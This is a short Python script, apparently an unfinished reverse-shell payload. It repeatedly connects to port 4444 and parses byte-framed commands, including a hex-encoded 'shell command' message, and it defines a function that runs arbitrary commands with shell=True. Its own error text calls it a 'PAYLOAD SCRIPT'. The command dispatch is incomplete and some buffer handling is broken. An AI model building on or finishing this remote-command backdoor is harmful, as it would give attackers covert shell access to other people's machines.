import socket as s
import sys
import time as t
import subprocess

bufferSize = 5

closeConnectionMessage = b'\x10\x10\x10\x10\x63\x6c\x63\x6f\x11\x11\x11\x11'
shellCmdMessage = b'\x10\x10\x10\x10\x65\x78\x73\x68\x63\x6d\x11\x11\x11\x11'
nextByteBufferSize = b'\x6e\x62\x62\x73'


def execShellCmd(cmd: str):
    shell = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE,
                             stdin=subprocess.PIPE)
    out = shell.stdout.read()
    error = shell.stderr.read()
    return out, error


def closeConnection(con: s.SOCK_STREAM):
    con.close()


def updateBufferSize(size: int):
    return size


commandSwitcher = {
    closeConnectionMessage: lambda con: closeConnection(con),
    shellCmdMessage: lambda cmd: execShellCmd(cmd),
    nextByteBufferSize: lambda size: size,
    
}

while True:
    try:

        connection = s.socket()

        connection.connect(("localhost", 4444))

        while True:
            t.sleep(1)
            recv = connection.recv(bufferSize)
            print(recv)
            if recv.startswith(b'\x10\x10\x10\x10'):
                start = recv.find(b"\x10\x10\x10\x10") + len(b'\x10\x10\x10\x10')
                print(start)
                end = recv.find(b'\x11\x11\x11\x11')
                command = recv[start: end]
                print(command)
            if recv.startswith(nextByteBufferSize):
                bufferSize = int.from_bytes(recv[4], "big")
                print(bufferSize)
                print(len(nextByteBufferSize))





    except Exception as eee:
        print("PAYLOAD SCRIPT ERROR: " + str(eee))
